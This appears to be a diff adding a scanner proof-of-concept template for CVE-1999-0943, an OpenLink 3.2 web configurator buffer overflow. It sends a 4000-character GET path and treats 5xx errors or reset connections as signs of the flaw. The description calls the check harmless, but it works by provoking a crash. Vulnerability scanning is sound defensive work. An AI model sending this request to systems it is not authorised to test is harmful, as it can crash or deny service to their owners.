@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "OpenLink 3.2 的 Web 配置器存在远程缓冲区溢出漏洞，未对 GET 请求长度做边界校验。本 PoC 通过向目标 Web 配置端口发送一条超长 GET 请求路径，观察目标是否返回异常响应、连接重置或服务崩溃，从而安全无损地验证漏洞存在。无需认证即可触发。"
+id = "POC-AVE-1999-1400"
+name = "CVE-1999-0943 OpenLink 3.2 Web Configurator Remote Buffer Overflow PoC"
+severity = "critical"
+tags = ["ave-1999-1400"]
+vuln_id = [
+    "CVE-1999-0943",
+    "AVE-1999-1400",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{repeat('A', 4000)}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection reset",
+    "Connection closed",
+    "Bad Gateway",
+    "Service Unavailable",
+]
